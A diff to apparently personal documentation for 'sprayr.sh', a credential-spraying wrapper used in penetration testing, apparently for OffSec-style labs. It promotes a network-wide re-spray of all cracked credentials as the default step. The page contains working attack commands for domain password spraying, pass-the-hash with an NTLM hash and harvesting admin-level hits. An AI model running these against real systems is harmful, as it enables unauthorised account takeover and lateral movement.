@@ -14,6 +14,8 @@ Multi-protocol credential spray wrapper. Given a cracked or obtained credential,
 
 **Authentication testing only — no command execution.**
 
+> [!important] **The engagement default loop:** After ANY successful crack → `./sprayr.sh --from-creds`. After spray → read `next_steps.txt` for pre-built follow-on commands. This is the credential loop.
+
 > [!warning] Lockout risk — read before running
 > Domain sprays with a user file can trigger lockouts. Always check the lockout policy first with `adr.sh --quick`. Use `--safe` when spraying domain accounts.
 
@@ -22,13 +24,16 @@ Multi-protocol credential spray wrapper. Given a cracked or obtained credential,
 ## Quick Reference
 
 ```bash
+# ★ Re-spray ALL creds after any crack (THE engagement default — one command covers everything)
+./sprayr.sh --from-creds
+
 # Validate a cracked password against all protocols
 ./sprayr.sh -u administrator -p 'Password123!' -t 192.168.1.10
 
 # Pass-the-hash validation (SMB/WinRM/RDP/LDAP/MSSQL only — SSH/FTP auto-skipped)
 ./sprayr.sh -u administrator -H fc525c9683e8fe067095ba2ddc971889 -t 192.168.1.10
 
-# Domain spray — check lockout policy first!
+# Domain spray — check lockout policy first! Always --safe with user files
 ./sprayr.sh -U users.txt -p 'Welcome1' -d corp.local -t 192.168.1.0/24 --safe
 
 # Fast SMB-only validation
@@ -39,9 +44,6 @@ Multi-protocol credential spray wrapper. Given a cracked or obtained credential,
 
 # Specific protocols only
 ./sprayr.sh -u admin -p 'Pass' -t 192.168.1.10 --proto smb,winrm,ldap
-
-# Re-spray ALL creds from $TOOLKIT_ROOT/creds.txt against ALL recon targets
-./sprayr.sh --from-creds
 ```
 
 ---
@@ -108,9 +110,10 @@ Multi-protocol credential spray wrapper. Given a cracked or obtained credential,
 
 ## Safe Mode vs. Parallel Mode
 
-**Default (parallel):** All protocols sprayed simultaneously as background jobs. Fastest but highest noise. Fine for single-target credential validation.
+> [!tip] **Simple rule:** Domain spray with a user file → always `--safe`. Single-cred validation → default (parallel) is fine.
 
-**`--safe`:** Protocols run sequentially with `--jitter 2` (2s between attempts). Use this for domain account sprays with a user list — reduces lockout risk. Slower but OffSec engagement–appropriate.
+**Default (parallel):** All protocols sprayed simultaneously. Fastest. Fine for single-target validation.
+**`--safe`:** Sequential with 2s jitter between attempts. Use for domain account sprays with user lists to reduce lockout risk.
 
 ---
 
@@ -170,6 +173,17 @@ SSH and FTP do not support NTLM hash auth — auto-skipped with a warning when u
 
 ## Common Workflows
 
+### ★ Re-spray all known creds (THE engagement default)
+```bash
+# After crackr.sh cracks anything — spray every cred in creds.txt
+# against every host found in recon. One command covers the whole network.
+./sprayr.sh --from-creds
+
+# Then immediately:
+cat $TOOLKIT_ROOT/spray/respray_<ts>_<user>/next_steps.txt    # pre-built follow-on commands
+cat $TOOLKIT_ROOT/spray/respray_<ts>_<user>/pwnd.txt           # admin-level hits
+```
+
 ### Validate a cracked hash immediately
 ```bash
 # After crackr.sh cracks a hash
@@ -188,16 +202,6 @@ cat $TOOLKIT_ROOT/ad/corp.local/password_policy.txt | grep -i lockout
 ./sprayr.sh -U $TOOLKIT_ROOT/ad/corp.local/users/all_users.txt \
   -p 'Summer2024!' -d corp.local \
   -t 10.10.10.5 --safe
-```
-
-### Re-spray all known creds (post-crack sweep)
-```bash
-# After crackr.sh cracks anything — spray every cred in creds.txt
-# against every host found in recon. One command covers the whole network.
-./sprayr.sh --from-creds
-
-# Hits land in: $TOOLKIT_ROOT/spray/respray_<ts>_<user>/
-# All hits also appended to: $TOOLKIT_ROOT/creds.txt
 ```
 
 ### Pass-the-Hash lateral movement validation
@@ -245,6 +249,6 @@ nxc smb 192.168.1.10 -u admin -p 'Password1' --local-auth
 
 - [[adr.sh]] — run first to get users/all_users.txt and check lockout policy
 - [[crackr]] — crack the hashes that sprayr.sh then validates
-- [[PtH_PtT]] — what to do after Pwn3d! hits
+- [[Active_Directory_PtH_PtT]] — what to do after Pwn3d! hits
 - [[Active_Directory]] — broader AD attack methodology
 - [[OffSec_AD_Mental_Model_Bus_Review]] — decision-tree for lateral movement
